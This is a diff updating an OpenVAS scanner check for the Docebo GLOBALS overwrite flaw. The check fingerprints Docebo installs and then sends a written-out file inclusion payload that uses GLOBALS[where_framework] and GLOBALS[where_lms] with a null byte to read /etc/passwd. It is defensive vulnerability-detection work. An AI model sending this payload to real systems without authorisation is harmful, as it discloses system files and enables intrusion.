@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: docebo_globals_overwrite.nasl 4053 2016-09-14 05:26:09Z teissa $
+# $Id: docebo_globals_overwrite.nasl 5779 2017-03-30 06:57:12Z cfi $
 # Description: Docebo GLOBALS Variable Overwrite Vulnerability
 #
 # Authors:
@@ -43,34 +43,28 @@ tag_solution = "Disable PHP's register_globals and/or upgrade to a newer PHP rel
 # Original advisory / discovered by :
 # http://milw0rm.com/exploits/1817
 
-if (description) {
+if(description){
+
  script_id(200011);
- script_version("$Revision: 4053 $");
- script_tag(name:"last_modification", value:"$Date: 2016-09-14 07:26:09 +0200 (Wed, 14 Sep 2016) $");
+ script_version("$Revision: 5779 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
-
- script_cve_id("CVE-2006-2576", 
-	       "CVE-2006-2577");
+ script_cve_id("CVE-2006-2576", "CVE-2006-2577");
  script_bugtraq_id(18109);
  script_xref(name:"OSVDB", value:"25757");
-
- name = "Docebo GLOBALS Variable Overwrite Vulnerability";
- script_name(name);
-
- summary = "Checks for file inclusions errors in multiple Docebo applications";
-
+ script_name("Docebo GLOBALS Variable Overwrite Vulnerability");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
 
- script_dependencies("http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
-script_tag(name : "solution" , value : tag_solution);
-script_tag(name : "summary" , value : tag_summary);
+ script_tag(name : "solution" , value : tag_solution);
+ script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://secunia.com/advisories/20260/");
  script_xref(name : "URL" , value : "http://www.hardened-php.net/advisory_202005.79.html");
  exit(0);
@@ -78,45 +72,43 @@ script_tag(name : "summary" , value : tag_summary);
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
 
-success = 0;
+success = FALSE;
 
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
-dirs = make_list("/doceboLms", "/doceboKms", "/doceboCms", "/doceboCore", cgi_dirs());
-		 
-foreach dir (dirs) {
- req = http_get(item:string(dir, "/index.php"), port:port);
- res = http_keepalive_send_recv(data:req, port:port, bodyonly:0);
+foreach dir( make_list_unique( "/doceboLms", "/doceboKms", "/doceboCms", "/doceboCore", cgi_dirs( port:port ) ) ) {
 
- if (egrep(pattern:"^Set-Cookie:.+docebo_session=", string:res) ||
-     egrep(pattern:'title="Powered by Docebo(KMS|LMS|CMS)"', string:res) ||
-     egrep(pattern:"powered_by.+<a href[^/]+\/\/www\.docebo\.org", string:res)) {
+  if( dir == "/" ) dir = "";
+  res = http_get_cache(item:string(dir, "/index.php"), port:port);
+
+  if (egrep(pattern:"^Set-Cookie:.+docebo_session=", string:res) ||
+      egrep(pattern:'title="Powered by Docebo(KMS|LMS|CMS)"', string:res) ||
+      egrep(pattern:"powered_by.+<a href[^/]+\/\/www\.docebo\.org", string:res)) {
  
-  uri = "/lib/lib.php";
-  globals[0] = "GLOBALS[where_framework]=";
-  globals[1] = "GLOBALS[where_lms]=";
-  lfile = "/etc/passwd";
+    uri = "/lib/lib.php";
+    globals[0] = "GLOBALS[where_framework]=";
+    globals[1] = "GLOBALS[where_lms]=";
+    lfile = "/etc/passwd";
 
-  for(n = 0; globals[n]; n++) { 
-   req = http_get(item:string(dir, uri, "?", globals[n], lfile, "%00"), port:port);
-   recv = http_keepalive_send_recv(data:req, port:port, bodyonly:1);
+    for(n = 0; globals[n]; n++) { 
+      req = http_get(item:string(dir, uri, "?", globals[n], lfile, "%00"), port:port);
+      recv = http_keepalive_send_recv(data:req, port:port, bodyonly:1);
 
-   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
-    n++;
-    success = 1;
-    path += string("http://", get_host_name(),  dir, "\n"); 
-   }
+      if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
+        n++;
+        success = TRUE;
+        path += string("http://", get_host_name(),  dir, "\n"); 
+      }
+    }
   }
- }
 }
 
 if (success) {
- report = string("Below the full path to the vulnerable Docebo application(s):\n\n",
-	path);
- security_message(port:port, data:report);
+  report = string("Below the full path to the vulnerable Docebo application(s):\n\n", path);
+  security_message(port:port, data:report);
+  exit(0);
 }
-exit(0);
+
+exit(99);
